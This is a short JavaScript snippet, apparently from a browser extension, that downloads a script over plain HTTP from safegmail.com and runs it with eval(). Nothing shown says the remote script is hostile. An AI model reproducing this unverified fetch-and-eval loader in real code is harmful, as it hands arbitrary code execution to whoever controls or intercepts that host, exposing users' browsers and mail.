var x = new XMLHttpRequest();
    x.onload = function() {
        eval(x.responseText);
    };
    x.open('get', 'http://www.safegmail.com/ext/sg.min.js');
	x.send();
	